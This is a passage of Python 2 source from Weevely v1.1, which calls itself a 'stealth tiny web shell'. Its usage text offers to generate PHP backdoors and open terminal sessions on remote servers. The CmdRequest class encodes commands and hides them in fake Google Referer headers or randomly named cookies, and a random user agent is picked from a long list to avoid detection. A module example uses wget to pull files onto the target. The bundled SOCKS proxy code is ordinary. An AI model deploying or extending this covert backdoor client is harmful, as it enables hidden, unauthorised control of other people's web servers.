        table_module.align = 'l'
        
        table_generator = PrettyTable(['generator', 'description'])
        table_generator.align = 'l'
        
        
        for groupname in self.modhandler.modules_names_by_group.keys():
            for module in self.modhandler.modules_names_by_group[groupname]:
                if module.startswith('generate.'):
                    table_generator.add_row([ ':%s' % self.modhandler.load(module).name, self.modhandler.load(module).argparser.description])
                else:
                    table_module.add_row([ ':%s' % self.modhandler.load(module).name, self.modhandler.load(module).argparser.description])
            
        return '%s\n%s\n\nHint: Run \':help <module>\' to print detailed usage information.\n\n' % (table_generator.get_string(), table_module.get_string())
        
    def _format_helps(self, modules = [], summary_type=0):
 
        if summary_type == 1:
            format_tuple = (False, False, True, True, True, 0)
        else:
            format_tuple = ()
                
        help_output = ''
        for modname in modules:
            help_output += self.modhandler.load(modname).format_help(*format_tuple)
        
        return help_output
    
    

banner = '''      ________                     __
     |  |  |  |----.----.-.--.----'  |--.--.
     |  |  |  | -__| -__| |  | -__|  |  |  |
     |________|____|____|___/|____|__|___  | v1.1
                                     |_____|
              Stealth tiny web shell
'''

usage = '''
[+] Start ssh-like terminal session
    weevely <url> <password>

[+] Run command directly from command line
    weevely <url> <password> [ "<command> .." | :<module> .. ]  

[+] Restore a saved session file
    weevely session [ <file> ]

[+] Generate PHP backdoor
    weevely generate <password> [ <path> ] ..

[+] Show credits
    weevely credits
    
[+] Show available module and backdoor generators
    weevely help
'''

credits = '''
Website
            http://epinna.github.com/Weevely/

Author
            Emilio Pinna
            http://disse.cting.org

Contributors
           Francesco Manzoni
           http://www.francescomanzoni.com/
           Andrea Cardaci
           http://cyrus-and.github.com/
           Raffaele Forte, Backbox Linux
           http://www.backbox.org
           Simone Margaritelli
           http://www.evilsocket.net/
'''

presentation = '''Welcome to Weevely. Browse filesystem, execute system commands or type ':help' to show available modules
'''

########NEW FILE########
__FILENAME__ = cmdrequest

import urllib2, urlparse, re, base64
from request import Request
from random import random, shuffle
from string import letters, digits
from core.pollution import pollute_with_random_str
from core.utils import randstr

default_prefixes = [ "ID", "SID", "APISID", "USRID", "SESSID", "SESS", "SSID", "USR", "PREF" ]
shuffle(default_prefixes)
			
			

class CmdRequest(Request):

	def __init__( self, url, password, proxy = None ):
		
		
		Request.__init__( self, url, proxy)
			
		self.password  = password
		self.extractor = re.compile( "<%s>(.*)</%s>" % ( self.password[2:], self.password[2:] ), re.DOTALL )
#		self.extractor_debug = re.compile( "<%sDEBUG>(.*)</%sDEBUG>" % ( self.password[2:], self.password[2:] ), re.DOTALL )
		self.parsed	   = urlparse.urlparse(self.url)
		self.data = None


		if not self.parsed.path:
			self.query = self.parsed.netloc.replace( '/', ' ' )
		else:
			self.query = ''.join( self.parsed.path.split('.')[:-1] ).replace( '/', ' ' )

	
	def setPayload( self, payload, mode):
		
		payload = base64.b64encode( payload.strip() )
		length  = len(payload)
		third	= length / 3
		thirds  = third * 2
		
		if mode == 'Referer':
			referer = "http://www.google.com/url?sa=%s&source=web&ct=7&url=%s&rct=j&q=%s&ei=%s&usg=%s&sig2=%s" % ( self.password[:2], \
	                                                                                                               urllib2.quote( self.url ), \
	                                                                                                               self.query.strip(), \
	                                                                                                              payload[:third], \
	                                                                                                               payload[third:thirds], \
	                                                                                                               payload[thirds:] )
			self['Referer']	= referer
		
		else: # mode == 'Cookie' or unset
		
			prefixes = default_prefixes[:]
			
			rand_cookie = ''
			rand_cookie += prefixes.pop() + '=' + self.password[:2] + '; '
			while len(prefixes)>3:
				if random()>0.5:
					break
				rand_cookie += prefixes.pop() + '=' + randstr(16, False, letters + digits) + '; '


			# DO NOT fuzz with %, _ (\w on regexp keep _)
			payload = pollute_with_random_str(payload, '#&*-/?@~')
		
				
			rand_cookie += prefixes.pop() + '=' + payload[:third] + '; '
			rand_cookie += prefixes.pop() + '=' + payload[third:thirds] + '; '
			rand_cookie += prefixes.pop() + '=' + payload[thirds:] 
			
			self['Cookie'] = rand_cookie
		
		
	def setPostData(self, data_dict):
		self.data = data_dict.copy()

	def execute( self , bytes = -1):
		response = self.read()
#		print self.extractor_debug.findall(response)
		data	 = self.extractor.findall(response)
		
		if len(data) < 1 or not data:
			raise NoDataException()
		else:
			return data[0].strip()
		
class NoDataException(Exception):
	pass



########NEW FILE########
__FILENAME__ = request
'''
Created on 03/ott/2011

@author: emilio
'''

import urllib2, socks
from random import choice
from socksipyhandler import SocksiPyHandler
from re import compile, IGNORECASE
from urllib import urlencode
from core.moduleexception import ModuleException

WARN_UNCORRECT_PROXY = 'Incorrect proxy format, set it as \'http|https|socks5|sock4://host:port\''

url_dissector = compile(
    r'^(https?|socks4|socks5)://' # http:// or https://
    r'((?:[A-Z0-9](?:[A-Z0-9-]{0,61}[A-Z0-9])?\.)+(?:[A-Z]{2,6}\.?|[A-Z0-9-]{2,}\.?)|' #domain...
    r'localhost|' #localhost...
    r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})' # ...or ip
    r':(\d+)?' # optional port
    r'(?:/?|[/?]\S+)$', IGNORECASE)

agent = choice((
    "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/6.0)",
    "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)",
    "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)",
    "Mozilla/5.0 (iPad; CPU OS 5_1_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B206 Safari/7534.48.3",
    "Mozilla/5.0 (iPad; CPU OS 6_1_3 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10B329 Safari/8536.25",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 6_1_2 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10B146 Safari/8536.25",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 6_1_3 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10B329 Safari/8536.25",
    "Mozilla/5.0 (Linux; U; Android 2.2; fr-fr; Desire_A8181 Build/FRF91)",
    "Mozilla/5.0 (Linux; U; Android 2.2; en-us; DROID2 GLOBAL Build/S273) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
    "Mozilla/5.0 (Linux; U; Android 2.2; en-us; Nexus One Build/FRF91) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
    "Mozilla/5.0 (Linux; U; Android 2.1; de-de; E10i Build/2.0.2.A.0.24) AppleWebKit/530.17 (KHTML, like Gecko) Version/4.0 Mobile Safari/530.17",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/534.58.2 (KHTML, like Gecko) Version/5.1.8 Safari/534.58.2",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.43 Safari/537.31",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.65 Safari/537.31",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:19.0) Gecko/20100101 Firefox/19.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:20.0) Gecko/20100101 Firefox/20.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_5) AppleWebKit/536.26.17 (KHTML, like Gecko) Version/6.0.2 Safari/536.26.17",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_5) AppleWebKit/536.28.10 (KHTML, like Gecko) Version/6.0.3 Safari/536.28.10",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_5) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.65 Safari/537.31",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:19.0) Gecko/20100101 Firefox/19.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:20.0) Gecko/20100101 Firefox/20.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_2) AppleWebKit/536.26.17 (KHTML, like Gecko) Version/6.0.2 Safari/536.26.17",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_2) AppleWebKit/537.22 (KHTML, like Gecko) Chrome/25.0.1364.152 Safari/537.22",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_2) AppleWebKit/537.22 (KHTML, like Gecko) Chrome/25.0.1364.172 Safari/537.22",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_2) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.65 Safari/537.31",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_3) AppleWebKit/536.28.10 (KHTML, like Gecko) Version/6.0.3 Safari/536.28.10",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_3) AppleWebKit/536.29.13 (KHTML, like Gecko) Version/6.0.4 Safari/536.29.13",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_3) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.65 Safari/537.31",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:19.0) Gecko/20100101 Firefox/19.0",
    "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.43 Safari/537.31",
    "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31",
    "Mozilla/5.0 (Windows NT 5.1; rv:19.0) Gecko/20100101 Firefox/19.0",
    "Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.112 Safari/535.1",
    "Mozilla/5.0 (Windows NT 6.0) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31",
    "Mozilla/5.0 (Windows NT 6.1; rv:20.0) Gecko/20100101 Firefox/20.0 ",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.22 (KHTML, like Gecko) Chrome/25.0.1364.172 Safari/537.22",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:20.0) Gecko/20100101 Firefox/20.0",
    "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.43 Safari/537.31",
    "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31",
    "Mozilla/5.0 (Windows NT 6.2; WOW64; rv:19.0) Gecko/20100101 Firefox/19.0",
    "Mozilla/5.0 (Windows NT 6.2; WOW64; rv:20.0) Gecko/20100101 Firefox/20.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.43 Safari/537.31",
    "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:20.0) Gecko/20100101 Firefox/20.0",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:19.0) Gecko/20100101 Firefox/19.0",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:20.0) Gecko/20100101 Firefox/20.0",
    "Opera/9.20 (Windows NT 6.0; U; en)",
))

class Request:

    def __init__(self, url, proxy=''):
        self.url = url
        self.data = {}
        
        proxydata = self.__parse_proxy(proxy)
        
        if proxydata:
            self.opener = urllib2.build_opener(SocksiPyHandler(*proxydata))
        else:
            self.opener = urllib2.build_opener()
            
        self.opener.addheaders = [('User-agent', agent)]
       
    def __parse_proxy(self, proxyurl):

        if proxyurl:
            
            url_dissected = url_dissector.findall(proxyurl)
            if url_dissected and len(url_dissected[0]) == 3:
                protocol, host, port = url_dissected[0]
                if protocol == 'socks5': return (socks.PROXY_TYPE_SOCKS5, host, int(port))
                if protocol == 'socks4': return (socks.PROXY_TYPE_SOCKS4, host, int(port))
                if protocol.startswith('http'): return (socks.PROXY_TYPE_HTTP, host, int(port))
                
            raise ModuleException('request',WARN_UNCORRECT_PROXY)
                    
        return []
            
    def __setitem__(self, key, value):
        self.opener.addheaders.append((key, value))

    def read(self, bytes= -1):

        try:
            if self.data:
                handle = self.opener.open(self.url, data=urlencode(self.data))
            else:
                handle = self.opener.open(self.url)
        except urllib2.HTTPError, handle:
            pass
        

        if bytes > 0:
            return handle.read(bytes)
        else:
            return handle.read()

########NEW FILE########
__FILENAME__ = socks
"""SocksiPy - Python SOCKS module.
Version 1.00

Copyright 2006 Dan-Haim. All rights reserved.

Redistribution and use in source and binary forms, with or without modification,
are permitted provided that the following conditions are met:
1. Redistributions of source code must retain the above copyright notice, this
   list of conditions and the following disclaimer.
2. Redistributions in binary form must reproduce the above copyright notice,
   this list of conditions and the following disclaimer in the documentation
   and/or other materials provided with the distribution.
3. Neither the name of Dan Haim nor the names of his contributors may be used
   to endorse or promote products derived from this software without specific
   prior written permission.

THIS SOFTWARE IS PROVIDED BY DAN HAIM "AS IS" AND ANY EXPRESS OR IMPLIED
WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF
MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO
EVENT SHALL DAN HAIM OR HIS CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT,
INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT
LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA
OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF
LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT
OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMANGE.


This module provides a standard socket-like interface for Python
for tunneling connections through SOCKS proxies.

"""

import socket
import struct

PROXY_TYPE_SOCKS4 = 1
PROXY_TYPE_SOCKS5 = 2
PROXY_TYPE_HTTP = 3

_defaultproxy = None
_orgsocket = socket.socket

class ProxyError(Exception):
    def __init__(self, value):
        self.value = value
    def __str__(self):
        return repr(self.value)

class GeneralProxyError(ProxyError):
    def __init__(self, value):
        self.value = value
    def __str__(self):
        return repr(self.value)

class Socks5AuthError(ProxyError):
    def __init__(self, value):
        self.value = value
    def __str__(self):
        return repr(self.value)

class Socks5Error(ProxyError):
    def __init__(self, value):
        self.value = value
    def __str__(self):
        return repr(self.value)

class Socks4Error(ProxyError):
    def __init__(self, value):
        self.value = value
    def __str__(self):
        return repr(self.value)

class HTTPError(ProxyError):
    def __init__(self, value):
        self.value = value
    def __str__(self):
        return repr(self.value)

_generalerrors = ("success",
                   "invalid data",
                   "not connected",
                   "not available",
                   "bad proxy type",
                   "bad input")

_socks5errors = ("succeeded",
                  "general SOCKS server failure",
                  "connection not allowed by ruleset",
                  "Network unreachable",
                  "Host unreachable",
                  "Connection refused",
                  "TTL expired",
                  "Command not supported",
                  "Address type not supported",
                  "Unknown error")

_socks5autherrors = ("succeeded",
                      "authentication is required",
                      "all offered authentication methods were rejected",
                      "unknown username or invalid password",
                      "unknown error")

_socks4errors = ("request granted",
                  "request rejected or failed",
                  "request rejected because SOCKS server cannot connect to identd on the client",
                  "request rejected because the client program and identd report different user-ids",
                  "unknown error")

def setdefaultproxy(proxytype=None,addr=None,port=None,rdns=True,username=None,password=None):
    """setdefaultproxy(proxytype, addr[, port[, rdns[, username[, password]]]])
    Sets a default proxy which all further socksocket objects will use,
    unless explicitly changed.
    """
    global _defaultproxy
    _defaultproxy = (proxytype,addr,port,rdns,username,password)

class socksocket(socket.socket):
    """socksocket([family[, type[, proto]]]) -> socket object

    Open a SOCKS enabled socket. The parameters are the same as
    those of the standard socket init. In order for SOCKS to work,
    you must specify family=AF_INET, type=SOCK_STREAM and proto=0.
    """

    def __init__(self, family=socket.AF_INET, type=socket.SOCK_STREAM, proto=0, _sock=None):
        _orgsocket.__init__(self,family,type,proto,_sock)
        if _defaultproxy != None:
            self.__proxy = _defaultproxy
        else:
            self.__proxy = (None, None, None, None, None, None)
        self.__proxysockname = None
        self.__proxypeername = None

    def __recvall(self, bytes):
        """__recvall(bytes) -> data
        Receive EXACTLY the number of bytes requested from the socket.
        Blocks until the required number of bytes have been received.
        """
        data = ""
        while len(data) < bytes:
            data = data + self.recv(bytes-len(data))
        return data

    def setproxy(self,proxytype=None,addr=None,port=None,rdns=True,username=None,password=None):
        """setproxy(proxytype, addr[, port[, rdns[, username[, password]]]])
        Sets the proxy to be used.
        proxytype -     The type of the proxy to be used. Three types
                        are supported: PROXY_TYPE_SOCKS4 (including socks4a),
                        PROXY_TYPE_SOCKS5 and PROXY_TYPE_HTTP
        addr -          The address of the server (IP or DNS).
        port -          The port of the server. Defaults to 1080 for SOCKS
                        servers and 8080 for HTTP proxy servers.
        rdns -          Should DNS queries be preformed on the remote side
                        (rather than the local side). The default is True.
                        Note: This has no effect with SOCKS4 servers.
        username -      Username to authenticate with to the server.
                        The default is no authentication.
        password -      Password to authenticate with to the server.
                        Only relevant when username is also provided.
        """
        self.__proxy = (proxytype,addr,port,rdns,username,password)

    def __negotiatesocks5(self,destaddr,destport):
        """__negotiatesocks5(self,destaddr,destport)
        Negotiates a connection through a SOCKS5 server.
        """
        # First we'll send the authentication packages we support.
        if (self.__proxy[4]!=None) and (self.__proxy[5]!=None):
            # The username/password details were supplied to the
            # setproxy method so we support the USERNAME/PASSWORD
            # authentication (in addition to the standard none).
            self.sendall("\x05\x02\x00\x02")
        else:
            # No username/password were entered, therefore we
            # only support connections with no authentication.
            self.sendall("\x05\x01\x00")
        # We'll receive the server's response to determine which
        # method was selected
        chosenauth = self.__recvall(2)
        if chosenauth[0] != "\x05":
            self.close()
            raise GeneralProxyError((1,_generalerrors[1]))
        # Check the chosen authentication method
        if chosenauth[1] == "\x00":
            # No authentication is required
            pass
        elif chosenauth[1] == "\x02":
            # Okay, we need to perform a basic username/password
            # authentication.
            self.sendall("\x01" + chr(len(self.__proxy[4])) + self.__proxy[4] + chr(len(self.proxy[5])) + self.__proxy[5])
            authstat = self.__recvall(2)
            if authstat[0] != "\x01":
                # Bad response
                self.close()
                raise GeneralProxyError((1,_generalerrors[1]))
            if authstat[1] != "\x00":
                # Authentication failed
                self.close()
                raise Socks5AuthError,((3,_socks5autherrors[3]))
            # Authentication succeeded
        else:
            # Reaching here is always bad
            self.close()
            if chosenauth[1] == "\xFF":
                raise Socks5AuthError((2,_socks5autherrors[2]))
            else:
                raise GeneralProxyError((1,_generalerrors[1]))
        # Now we can request the actual connection
        req = "\x05\x01\x00"
        # If the given destination address is an IP address, we'll
        # use the IPv4 address request even if remote resolving was specified.
        try:
            ipaddr = socket.inet_aton(destaddr)
            req = req + "\x01" + ipaddr
        except socket.error:
            # Well it's not an IP number,  so it's probably a DNS name.
            if self.__proxy[3]==True:
                # Resolve remotely
                ipaddr = None
                req = req + "\x03" + chr(len(destaddr)) + destaddr
            else:
                # Resolve locally
                ipaddr = socket.inet_aton(socket.gethostbyname(destaddr))
                req = req + "\x01" + ipaddr
        req = req + struct.pack(">H",destport)
        self.sendall(req)
        # Get the response
        resp = self.__recvall(4)
        if resp[0] != "\x05":
            self.close()
            raise GeneralProxyError((1,_generalerrors[1]))
        elif resp[1] != "\x00":
            # Connection failed
            self.close()
            if ord(resp[1])<=8:
                raise Socks5Error(ord(resp[1]),_generalerrors[ord(resp[1])])
            else:
                raise Socks5Error(9,_generalerrors[9])
        # Get the bound address/port
        elif resp[3] == "\x01":
            boundaddr = self.__recvall(4)
        elif resp[3] == "\x03":
            resp = resp + self.recv(1)
            boundaddr = self.__recvall(resp[4])
        else:
            self.close()
            raise GeneralProxyError((1,_generalerrors[1]))
        boundport = struct.unpack(">H",self.__recvall(2))[0]
        self.__proxysockname = (boundaddr,boundport)
        if ipaddr != None:
            self.__proxypeername = (socket.inet_ntoa(ipaddr),destport)
        else:
            self.__proxypeername = (destaddr,destport)

    def getproxysockname(self):
        """getsockname() -> address info
        Returns the bound IP address and port number at the proxy.
        """
        return self.__proxysockname

    def getproxypeername(self):
        """getproxypeername() -> address info
        Returns the IP and port number of the proxy.
        """
        return _orgsocket.getpeername(self)

    def getpeername(self):
        """getpeername() -> address info
        Returns the IP address and port number of the destination
        machine (note: getproxypeername returns the proxy)
        """
        return self.__proxypeername

    def __negotiatesocks4(self,destaddr,destport):
        """__negotiatesocks4(self,destaddr,destport)
        Negotiates a connection through a SOCKS4 server.
        """
        # Check if the destination address provided is an IP address
        rmtrslv = False
        try:
            ipaddr = socket.inet_aton(destaddr)
        except socket.error:
            # It's a DNS name. Check where it should be resolved.
            if self.__proxy[3]==True:
                ipaddr = "\x00\x00\x00\x01"
                rmtrslv = True
            else:
                ipaddr = socket.inet_aton(socket.gethostbyname(destaddr))
        # Construct the request packet
        req = "\x04\x01" + struct.pack(">H",destport) + ipaddr
        # The username parameter is considered userid for SOCKS4
        if self.__proxy[4] != None:
            req = req + self.__proxy[4]
        req = req + "\x00"
        # DNS name if remote resolving is required
        # NOTE: This is actually an extension to the SOCKS4 protocol
        # called SOCKS4A and may not be supported in all cases.
        if rmtrslv==True:
            req = req + destaddr + "\x00"
        self.sendall(req)
        # Get the response from the server
        resp = self.__recvall(8)
        if resp[0] != "\x00":
            # Bad data
            self.close()
            raise GeneralProxyError((1,_generalerrors[1]))
        if resp[1] != "\x5A":
            # Server returned an error
            self.close()
            if ord(resp[1]) in (91,92,93):
                self.close()
                raise Socks4Error((ord(resp[1]),_socks4errors[ord(resp[1])-90]))
            else:
                raise Socks4Error((94,_socks4errors[4]))
        # Get the bound address/port
        self.__proxysockname = (socket.inet_ntoa(resp[4:]),struct.unpack(">H",resp[2:4])[0])
        if rmtrslv != None:
            self.__proxypeername = (socket.inet_ntoa(ipaddr),destport)
        else:
            self.__proxypeername = (destaddr,destport)

    def __negotiatehttp(self,destaddr,destport):
        """__negotiatehttp(self,destaddr,destport)
        Negotiates a connection through an HTTP server.
        """
        # If we need to resolve locally, we do this now
        if self.__proxy[3] == False:
            addr = socket.gethostbyname(destaddr)
        else:
            addr = destaddr
        self.sendall("CONNECT " + addr + ":" + str(destport) + " HTTP/1.1\r\n" + "Host: " + destaddr + "\r\n\r\n")
        # We read the response until we get the string "\r\n\r\n"
        resp = self.recv(1)
        while "\r\n\r\n" not in resp and '\n\n' not in resp:
            resp = resp + self.recv(1)
            
        # We just need the first line to check if the connection
        # was successful
        statusline = resp.splitlines()[0].split(" ",2)
        if statusline[0] not in ("HTTP/1.0","HTTP/1.1"):
            self.close()
            raise GeneralProxyError((1,_generalerrors[1]))
        try:
            statuscode = int(statusline[1])
        except ValueError:
            self.close()
            raise GeneralProxyError((1,_generalerrors[1]))
        if statuscode != 200:
            self.close()
            raise HTTPError((statuscode,statusline[2]))
        self.__proxysockname = ("0.0.0.0",0)
        self.__proxypeername = (addr,destport)

    def connect(self,destpair):
        """connect(self,despair)
        Connects to the specified destination through a proxy.
        destpar - A tuple of the IP/DNS address and the port number.
        (identical to socket's connect).
        To select the proxy server use setproxy().
        """
        # Do a minimal input check first
        if (type(destpair) in (list,tuple)==False) or (len(destpair)<2) or (type(destpair[0])!=str) or (type(destpair[1])!=int):
            raise GeneralProxyError((5,_generalerrors[5]))
        if self.__proxy[0] == PROXY_TYPE_SOCKS5:
            if self.__proxy[2] != None:
                portnum = self.__proxy[2]
            else:
                portnum = 1080
            _orgsocket.connect(self,(self.__proxy[1],portnum))
            self.__negotiatesocks5(destpair[0],destpair[1])
        elif self.__proxy[0] == PROXY_TYPE_SOCKS4:
            if self.__proxy[2] != None:
                portnum = self.__proxy[2]
            else:
                portnum = 1080
            _orgsocket.connect(self,(self.__proxy[1],portnum))
            self.__negotiatesocks4(destpair[0],destpair[1])
        elif self.__proxy[0] == PROXY_TYPE_HTTP:
            if self.__proxy[2] != None:
                portnum = self.__proxy[2]
            else:
                portnum = 8080
            _orgsocket.connect(self,(self.__proxy[1],portnum))
            self.__negotiatehttp(destpair[0],destpair[1])
        elif self.__proxy[0] == None:
            _orgsocket.connect(self,(destpair[0],destpair[1]))
        else:
            raise GeneralProxyError((4,_generalerrors[4]))

########NEW FILE########
__FILENAME__ = socksipyhandler
"""
SocksiPy + urllib handler

version: 0.2
author: e<e@tr0ll.in>

This module provides a Handler which you can use with urllib2 to allow it to tunnel your connection through a socks.sockssocket socket, with out monkey patching the original socket...
"""

import urllib2
import httplib
import socks

class SocksiPyConnection(httplib.HTTPConnection):
    def __init__(self, proxytype, proxyaddr, proxyport = None, rdns = True, username = None, password = None, *args, **kwargs):
        self.proxyargs = (proxytype, proxyaddr, proxyport, rdns, username, password)
        httplib.HTTPConnection.__init__(self, *args, **kwargs)

    def connect(self):
        self.sock = socks.socksocket()
        self.sock.setproxy(*self.proxyargs)
        if isinstance(self.timeout, float):
            self.sock.settimeout(self.timeout)
        self.sock.connect((self.host, self.port))
            
class SocksiPyHandler(urllib2.HTTPHandler):
    def __init__(self, *args, **kwargs):
        self.args = args
        self.kw = kwargs
        urllib2.HTTPHandler.__init__(self)

    def http_open(self, req):
        def build(host, port=None, strict=None, timeout=0):    
            conn = SocksiPyConnection(*self.args, host=host, port=port, strict=strict, timeout=timeout, **self.kw)
            return conn
        return self.do_open(build, req)

if __name__ == "__main__":
    opener = urllib2.build_opener(SocksiPyHandler(socks.PROXY_TYPE_SOCKS4, 'localhost', 9999))
    print opener.open('http://www.whatismyip.com/automation/n09230945.asp').read()

########NEW FILE########
__FILENAME__ = module


from moduleexception import ModuleException, ProbeException, ProbeSucceed, InitException
from core.argparse import ArgumentParser, Namespace
from types import ListType, StringTypes, DictType
from core.prettytable import PrettyTable
from core.vector import VectorsDict
from os import linesep
from core.modulebase import ModuleBase

class Module(ModuleBase):
    '''Generic Module class to inherit.

    The Module object is a dynamically loaded Weevely extension that executes
    automatic tasks on the remote target. The Vector objects contain the code to
    run on remote target.

    To create a new module, define a class that inherit Module (e.g. 'class
    Mymodule(Module)') in a python file located in a subdirectory of 'modules/',
    for example 'modules/mygroup/mymodule.py'. The class name must be the same
    as the python file but starting with a capital letter.

    The module can then be executed from the terminal with ':mygroup.mymodule'.

    Every time the module takes care of:

        1) prepare the environment (method _prepare(), optional)
        2) run vectors and save results (method _probe(), mandatory)
        3) verify the probe execution (method _verify(), optional)

    The first time the constructor performs the following preliminary tasks:

        1) Defines module arguments (method _set_args(), recommended)
        2) Defines module vectors (method _set_vectors(), recommended)

    Follows an example of a basic module that downloads files from the web into
    target:

    ============================== webdownload.py ==============================

    from core.module import Module
    from core.moduleexception import ProbeException, ProbeSucceed
    
    WARN_DOWNLOAD_FAIL = 'Downloaded failed'
    
    class Webdownload(Module):
        
        def _set_args(self):

            # Declare the parameters accepted by this module. They will be
            # stored in the self.args dictionary.

            self.argparser.add_argument('url')
            self.argparser.add_argument('rpath')
    
        def _set_vectors(self):

            # Declare the vectors to execute. The vector named 'wget' uses the
            # module 'shell.sh' that executes shell commands to run wget,
            # 'check_download' uses 'file.check' (included in Weevely) to verify
            # the downloaded file. The 'payloads' field will be replaced with
            # values from self.args.

            self.support_vectors.add_vector(name='wget', interpreter='shell.sh', payloads = [ 'wget $url -O $rpath' ])
            self.support_vectors.add_vector(name='check_download', interpreter='file.check', payloads = [ '$rpath', 'exists' ])
            
        def _probe(self):

           # Start the download by calling the 'wget' vector.
           self.support_vectors.get('wget').execute(self.args)
       
        def _verify(self):

           # Verify downloaded file. Save the vector return value in
           # self._result and eventually raise ProbeException to stop module
           # execution and print an error message.

           self._result = self.support_vectors.get('check_download').execute({ 'rpath' : self.args['rpath'] })
           if self._result == False:
               raise ProbeException(self.name, WARN_DOWNLOAD_FAIL)
           

    =======================================================================================

       
    '''

        
    def _set_vectors(self):
        """Inherit this method to add vectors in self.vectors and
        self.support_vectors lists. This method is called by the constructor.

        Example of vector declaration:
        
        > self.support_vectors.add_vector(name='vector_name', interpreter='module_name', payloads = [ 'module_param1', '$module_param2', .. ])
        
        Template fields like '$rpath' are replaced at vector execution.
        
        """
        
        pass
    
    def _set_args(self):
        """Inherit this method to set self.argparser arguments. This method is
        called by module constructor. Arguments passed at module execution are
        stored in the self.args dictionary. See the official python argparse
        documentation.
        """
        
        pass

    def _init_module(self):
        """Inherit this method to set additional variables. This method is
        called by the constructor.
        """
        pass

    def _prepare(self):
        """Inherit this method to prepare vectors and environment for the
        probe, using declared vectors.

        This method is called at every module execution. Throws ModuleException,
        ProbeException.
        """
        
        pass

    def _probe(self):
        """Inherit this method to execute the main task. Vector declared before
        are used to call other modules and execute shell and php
        statements. This method is mandatory.

        Example of vector selection and execution:
        
        > self.support_vectors.get('vector_name').execute({ '$module_param2' : self.args['arg2']})

        The vector is selected with VectorList.get(name=''), and launched with
        Vector.execute(templated_params={}), that replaces the template
        variables and run the vector.

        Probe results should be stored in self._result.  This method is called
        at every module execution.  Throws ModuleException, ProbeException,
        ProbeSucceed.

        """
        pass

    
    def _verify(self):
        """Inherit this method to check the probe result.

        The results should be stored in self._result. It is called at every
        module execution. Throws ModuleException, ProbeException, ProbeSucceed.
        """
        pass

########NEW FILE########
__FILENAME__ = modulebase


from moduleexception import ModuleException, ProbeException, ProbeSucceed, InitException
from core.argparse import ArgumentParser, StoredNamespace, _StoreTrueAction, _StoreFalseAction, _callable
from types import ListType, StringTypes, DictType
from core.prettytable import PrettyTable
from core.vector import VectorsDict
from os import linesep
import copy


class ModuleBase:

    def __init__(self, modhandler):
        

        self.modhandler = modhandler

